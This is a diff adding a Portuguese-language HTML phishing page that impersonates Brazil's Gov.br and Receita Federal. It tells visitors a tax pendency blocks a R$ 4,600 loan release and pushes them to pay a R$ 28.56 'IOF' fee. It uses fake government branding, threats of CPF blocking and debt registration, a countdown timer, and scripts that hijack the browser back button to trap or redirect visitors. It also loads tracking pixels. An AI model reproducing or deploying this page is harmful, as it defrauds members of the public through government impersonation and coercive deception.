@@ -1,0 +1,242 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = '/redirect/up1/back2';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+<script>
+  window.pixelId = "69a0b73ca9aee7f86c217821";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gov.br - Pendência Fiscal</title>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- DESIGN SYSTEM GOVERNO FEDERAL --- */
+        :root {
+            --gov-blue: #1351b4;
+            --gov-dark: #0c326f;
+            --alert-red: #b91111;
+            --font-stack: 'Rawline', system-ui, -apple-system, sans-serif;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            margin: 0; padding: 0;
+            font-family: var(--font-stack);
+            background-color: #222; /* Fundo escuro focado */
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            min-height: 100vh;
+        }
+
+        /* CARD CENTRAL */
+        .modal-container {
+            background: #fff;
+            width: 95%; max-width: 480px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            position: relative;
+            border: 1px solid #ccc;
+        }
+
+        /* CABEÇALHO GOV */
+        .gov-header {
+            background: linear-gradient(to right, var(--gov-blue), var(--gov-dark));
+            padding: 15px 20px;
+            display: flex; align-items: center; gap: 12px;
+            color: white;
+        }
+        .gov-logo { height: 32px; filter: brightness(0) invert(1); }
+        .gov-title { 
+            font-size: 13px; font-weight: 600; line-height: 1.2; 
+            border-left: 1px solid rgba(255,255,255,0.3); padding-left: 12px; 
+        }
+
+        /* BODY */
+        .content-body { padding: 25px 20px; text-align: center; }
+
+        .alert-icon-box {
+            width: 60px; height: 60px; background: #fff5f5; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 15px auto; border: 2px solid var(--alert-red);
+            animation: pulse-red 2s infinite;
+        }
+        .alert-icon { font-size: 28px; color: var(--alert-red); }
+
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(185, 17, 17, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(185, 17, 17, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(185, 17, 17, 0); }
+        }
+
+        h1 {
+            font-size: 20px; font-weight: 800; color: var(--alert-red);
+            margin: 0 0 10px 0; text-transform: uppercase;
+        }
+
+        p { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 20px; }
+
+        /* CAIXA DE DADOS */
+        .debt-card {
+            background: #f8f9fa; border: 1px solid #ddd;
+            padding: 15px; border-radius: 6px; margin-bottom: 20px;
+            text-align: left;
+        }
+        .debt-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
+        .debt-label { color: #666; font-weight: 500; }
+        .debt-val { font-weight: 700; color: #333; }
+        
+        .divider { border-top: 1px dashed #ccc; margin: 10px 0; }
+
+        .warning-text {
+            font-size: 11px; color: var(--alert-red); font-weight: 600; 
+            background: #fff5f5; padding: 8px; border-radius: 4px; text-align: center;
+        }
+
+        /* BOTÃO */
+        .btn-action {
+            display: flex; align-items: center; justify-content: center; flex-direction: column;
+            width: 100%; padding: 16px;
+            background: #1351b4; color: white; /* Azul Gov */
+            border: none; border-radius: 6px;
+            font-size: 16px; font-weight: 700; text-transform: uppercase;
+            text-decoration: none; cursor: pointer;
+            box-shadow: 0 4px 6px rgba(19, 81, 180, 0.3);
+            transition: transform 0.1s;
+        }
+        .btn-action:active { transform: scale(0.98); }
+        .btn-sub { font-size: 11px; font-weight: 400; text-transform: none; margin-top: 3px; opacity: 0.8; }
+
+        /* FOOTER */
+        .footer {
+            background: #f8f9fa; padding: 12px; font-size: 10px; color: #888;
+            text-align: center; border-top: 1px solid #eee;
+        }
+
+        .timer {
+            font-size: 13px; color: #333; font-weight: 700; margin-top: 15px;
+        }
+        #countdown { color: var(--alert-red); }
+
+    </style>
+</head>
+<body>
+
+    <div class="modal-container">
+        <div class="gov-header">
+            <img src="images/1200px-Coat_of_arms_of_Brazil.svg.png" class="gov-logo" alt="Gov.br">
+            <div class="gov-title">
+                Receita Federal<br>
+                <span style="font-weight:400; font-size:11px;">Monitoramento de Transações</span>
+            </div>
+        </div>
+
+        <div class="content-body">
+            <div class="alert-icon-box">
+                <i class="fas fa-file-invoice-dollar alert-icon"></i>
+            </div>
+
+            <h1>Pendência Fiscal Detectada</h1>
+            
+            <p><strong>ATENÇÃO:</strong> Ao sair desta página, a guia de recolhimento do IOF será cancelada. Isso classificará a transferência de <strong>R$ 4.600,00</strong> como "Movimentação Não Declarada".</p>
+
+            <div class="debt-card">
+                <div class="debt-row">
+                    <span class="debt-label">Valor a Liberar:</span>
+                    <span class="debt-val" style="color:green">R$ 4.600,00</span>
+                </div>
+                <div class="debt-row">
+                    <span class="debt-label">Taxa IOF Pendente:</span>
+                    <span class="debt-val" style="color:red">R$ 28,56</span>
+                </div>
+                
+                <div class="divider"></div>
+                
+                <div class="warning-text">
+                    <i class="fas fa-exclamation-circle"></i> O não pagamento acarretará no bloqueio do CPF na base da Receita Federal e perda do direito ao empréstimo.
+                </div>
+            </div>
+
+            <p style="font-size: 13px; margin-bottom: 20px; line-height: 1.4;">
+                Regularize agora para evitar a inscrição na <strong>Dívida Ativa</strong>. O valor da taxa (R$ 28,56) será reembolsado junto com o empréstimo.
+            </p>
+
+            <a href="/11.php?valor=28.56" class="btn-action">
+                REGULARIZAR CPF AGORA
+                <span class="btn-sub">(Pagar R$ 28,56 e Liberar R$ 4.600)</span>
+            </a>
+
+            <div class="timer">
+                A guia expira em: <span id="countdown">04:59</span>
+            </div>
+        </div>
+
+        <div class="footer">
+            Sistema SISBACEN - Módulo de Segurança Fiscal<br>
+            Governo Federal - Pátria Amada Brasil
+        </div>
+    </div>
+
+    <script>
+        // Timer de Urgência
+        let time = 299; 
+        setInterval(() => {
+            let m = Math.floor(time / 60);
+            let s = time % 60;
+            m = m < 10 ? '0' + m : m;
+            s = s < 10 ? '0' + s : s;
+            document.getElementById('countdown').innerText = m + ':' + s;
+            if(time > 0) time--;
+        }, 1000);
+
+        // Script para segurar o back (básico)
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+    </script>
+
+
+</body></html>
